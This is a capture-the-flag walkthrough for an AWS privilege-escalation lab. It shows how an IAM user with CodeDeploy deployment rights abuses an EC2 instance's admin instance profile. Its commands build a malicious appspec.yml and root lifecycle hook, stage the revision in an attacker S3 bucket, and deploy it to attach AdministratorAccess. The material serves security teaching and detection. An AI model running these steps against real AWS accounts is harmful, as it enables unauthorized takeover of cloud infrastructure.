# Solution: AWS CodeDeploy CreateDeployment to Admin via Existing Admin EC2 Instance Profile

AWS CodeDeploy is a deployment automation service that orchestrates application deployments to fleets of EC2 instances. What makes it dangerous from a privilege escalation perspective is that it provides a legitimate, API-driven code execution channel — one that runs under the target EC2 instance's IAM credentials rather than the caller's. An attacker who holds only `codedeploy:CreateDeployment` can point a deployment at their own malicious revision, causing the CodeDeploy agent on the target instance to execute arbitrary shell scripts with the full permissions of whatever IAM role is attached to that instance as its instance profile.

This is a textbook "existing passrole" privilege escalation path. The attacker never touches `iam:PassRole`, never opens an SSH session, and never sends an SSM command. The instance profile was already configured with administrative permissions for legitimate application purposes — the attacker simply routes code execution through the deployment channel to abuse it.

This technique is particularly dangerous because most cloud security teams tune their detection rules around `iam:PassRole` and `ssm:SendCommand` as the canonical code-execution-to-admin paths. CodeDeploy sits in a separate service namespace (`codedeploy:CreateDeployment`) and is commonly granted to CI/CD service accounts or developer IAM users for legitimate deployment automation. A CSPM tool that only checks `iam:PassRole` chains will miss it entirely.

## The Challenge

You have obtained credentials for `pl-prod-codedeploy-001-to-admin-starting-user` — an IAM user in the account with CodeDeploy deployment permissions. The user can trigger deployments (`codedeploy:CreateDeployment`), register revisions (`codedeploy:RegisterApplicationRevision`), and read deployment configuration (`codedeploy:GetDeploymentConfig`).

Somewhere in this account is an EC2 instance running the CodeDeploy agent with an administrative IAM role attached as its instance profile. A CodeDeploy application and deployment group already exist, targeting that instance. Your goal is to trigger a deployment that executes malicious lifecycle hook scripts under the admin instance profile, using those admin credentials to grant your starting user the ability to read the CTF flag.

Start by confirming your identity and baseline access:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-codedeploy-001-to-admin-starting-user`. Confirm you cannot read the flag yet:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/codedeploy-001-to-admin \
  --region us-east-1
# AccessDenied
```

Good — no flag access yet. Now let's get there.

## Reconnaissance

The helpful permissions give you a solid view of what you're working with. Start by discovering the CodeDeploy application and deployment group:

```bash
aws deploy list-applications --region us-east-1
```

You'll see `pl-prod-codedeploy-001-to-admin-app`. List its deployment groups:

```bash
aws deploy list-deployment-groups \
  --application-name pl-prod-codedeploy-001-to-admin-app \
  --region us-east-1
```

There's one: `pl-prod-codedeploy-001-to-admin-dg`. Get the deployment group details to understand its target:

```bash
aws deploy get-deployment-group \
  --application-name pl-prod-codedeploy-001-to-admin-app \
  --deployment-group-name pl-prod-codedeploy-001-to-admin-dg \
  --region us-east-1
```

The response will show you the EC2 tag filters used to target instances, the IAM service role, and the deployment configuration. The tag filters will point to the EC2 instance tagged for this scenario. Look up that instance to confirm its instance profile:

```bash
aws ec2 describe-instances \
  --filters "Name=tag:Name,Values=pl-prod-codedeploy-001-to-admin-target" \
  --query 'Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn,State.Name]' \
  --output table \
  --region us-east-1
```

You'll see the instance profile ARN referencing `pl-prod-codedeploy-001-to-admin-ec2-role` — the administrative role that makes this attack possible. You now have the full picture: a deployment group targeting an instance with an admin role, and you have the permissions to trigger a deployment.

## Exploitation

The attack works in four steps: build the malicious revision, upload it to an attacker-controlled S3 bucket, register it with CodeDeploy, and trigger the deployment.

### Step 1: Build the malicious revision

A CodeDeploy revision is a ZIP file containing an `appspec.yml` at the root and any referenced scripts. The `appspec.yml` declares lifecycle hooks — shell scripts that the CodeDeploy agent executes at specific points in the deployment lifecycle. You want the `BeforeInstall` hook, which runs before any application files are deployed and therefore executes even on a fresh deployment with no existing application installed.

Create the directory structure:

```bash
mkdir -p codedeploy-revision/scripts
```

Write the `appspec.yml`:

```bash
cat > codedeploy-revision/appspec.yml << 'EOF'
version: 0.0
os: linux
hooks:
  BeforeInstall:
    - location: scripts/escalate.sh
      timeout: 300
      runas: root
EOF
```

Write the escalation hook. This script runs on the EC2 instance under the admin instance profile credentials. It reads the name of the starting user from a pre-populated SSM parameter (set by Terraform during lab setup), then calls `iam:AttachUserPolicy` to attach the `AdministratorAccess` managed policy to that user:

```bash
cat > codedeploy-revision/scripts/escalate.sh << 'EOF'
#!/bin/bash
set -e
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
TARGET_USER=$(aws ssm get-parameter \
  --name /pl/codedeploy-001/target-user \
  --region "$REGION" \
  --query Parameter.Value \
  --output text)
aws iam attach-user-policy \
  --user-name "$TARGET_USER" \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
EOF
chmod +x codedeploy-revision/scripts/escalate.sh
```

Package it into a ZIP:

```bash
cd codedeploy-revision
zip -r ../malicious-revision.zip appspec.yml scripts/
cd ..
```

### Step 2: Upload to the attacker-controlled S3 bucket

The Terraform lab setup pre-creates an attacker-controlled S3 bucket (`pl-attacker-codedeploy-001-revision-{account_id}`) with a bucket policy that grants the victim account and the CodeDeploy service principal `s3:GetObject`. Upload the revision:

```bash
aws s3 cp malicious-revision.zip \
  s3://pl-attacker-codedeploy-001-revision-{account_id}/revision.zip
```

Note that you are uploading this as the starting user — but the starting user doesn't need `s3:PutObject` on this bucket in the victim account. The attacker controls the bucket and its policy. In a real attack, the bucket would be in the attacker's AWS account entirely.

### Step 3: Register the revision with CodeDeploy

CodeDeploy requires you to register a revision before deploying it. This is just a metadata record — it doesn't execute anything yet:

```bash
aws deploy register-application-revision \
  --application-name pl-prod-codedeploy-001-to-admin-app \
  --s3-location bucket=pl-attacker-codedeploy-001-revision-{account_id},key=revision.zip,bundleType=zip \
  --region us-east-1
```

### Step 4: Trigger the deployment

Now create the deployment. This is the key API call — it instructs CodeDeploy to orchestrate the download and execution of your malicious revision on every EC2 instance in the deployment group:

```bash
REVISION_JSON=$(jq -cn \
  --arg bucket "pl-attacker-codedeploy-001-revision-{account_id}" \
  '{revisionType: "S3", s3Location: {bucket: $bucket, key: "revision.zip", bundleType: "zip"}}')

aws deploy create-deployment \
  --application-name pl-prod-codedeploy-001-to-admin-app \
  --deployment-group-name pl-prod-codedeploy-001-to-admin-dg \
  --revision "$REVISION_JSON" \
  --ignore-application-stop-failures \
  --file-exists-behavior OVERWRITE \
  --region us-east-1
```

Note the `deploymentId` in the response (it will look like `d-XXXXXXXXX`). The deployment is now in progress. Behind the scenes, the CodeDeploy service is sending the deployment instructions to the agent running on `pl-prod-codedeploy-001-to-admin-target`. The agent will download the revision ZIP from your attacker S3 bucket and execute `scripts/escalate.sh` as root.

Keep in mind: the CodeDeploy agent needs a few minutes to start up after the EC2 instance boots. If you're running the demo shortly after `plabs apply` completes, the agent may not be ready yet. Poll the deployment status:

```bash
aws deploy get-deployment \
  --deployment-id d-XXXXXXXXX \
  --query 'deploymentInfo.status' \
  --output text \
  --region us-east-1
```

You'll see `Created` → `Queued` → `InProgress` → `Succeeded`. The transition to `Succeeded` means `escalate.sh` executed and `iam:AttachUserPolicy` was called successfully.

## Verification

Wait about 15 seconds for IAM managed policy attachment propagation. Then, using your original starting user credentials (no credential rotation required — it's the same IAM user, now with `AdministratorAccess` attached), verify the escalation worked:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-codedeploy-001-to-admin-starting-user

# Should list: AdministratorAccess (arn:aws:iam::aws:policy/AdministratorAccess)
```

`AdministratorAccess` is now attached. Confirm you have full admin access — and confirm the flag is readable:

```bash
# This now succeeds (AdministratorAccess grants iam:ListUsers)
aws iam list-users --max-items 3

# And the flag is readable too
aws ssm get-parameter \
  --name /pathfinding-labs/flags/codedeploy-001-to-admin \
  --region us-east-1
```

Both commands succeed. The hook executed under `pl-prod-codedeploy-001-to-admin-ec2-role`'s credentials — the admin instance profile — and used those to attach `AdministratorAccess` to your IAM user. You never held admin credentials directly; instead, the admin role did the work for you via the CodeDeploy execution channel.

## Capture the Flag

For `to-admin` scenarios in Pathfinding Labs, the CTF flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. The `AdministratorAccess` policy that the lifecycle hook attached to your starting user grants `ssm:GetParameter` on all resources (among everything else), which is more than enough to read the flag.

Using your starting user credentials (the same ones you've been using throughout — no new credentials needed):

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/codedeploy-001-to-admin \
  --query 'Parameter.Value' \
  --output text \
  --region us-east-1
```

The value returned is the deployment-specific flag. Its exact contents come from `flags.default.yaml` in the repository root; hosted lab operators may substitute their own flag values. The retrieval path and command format are consistent across all `to-admin` scenarios — only the scenario ID in the parameter name changes.

## What Happened

You started with `codedeploy:CreateDeployment` and four supporting CodeDeploy permissions — no `iam:PassRole`, no `ssm:SendCommand`, no direct IAM modification rights. By staging a malicious appspec.yml revision in an attacker-controlled S3 bucket and triggering a deployment to a pre-existing deployment group, you caused the CodeDeploy agent on the target EC2 instance to execute your hook script under the instance's admin instance profile. That script called `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user, completing the privilege escalation without ever holding admin credentials yourself.

This is the core of the "existing passrole" pattern: the privilege escalation doesn't require modifying the EC2 instance's IAM role or attaching a role to a new resource. The admin credentials were already there, bound to a running instance. The attacker simply needed a path to code execution on that instance — and CodeDeploy provides that path without any of the traditional warning signs (`iam:PassRole`, `ssm:SendCommand`) that security teams look for. In real environments, developers and CI/CD systems are routinely granted `codedeploy:CreateDeployment` for legitimate deployment automation, and EC2 instances carrying powerful roles for application purposes are common. The dangerous combination goes undetected until someone thinks to ask: who can deploy code to these instances, and what would that code run as?
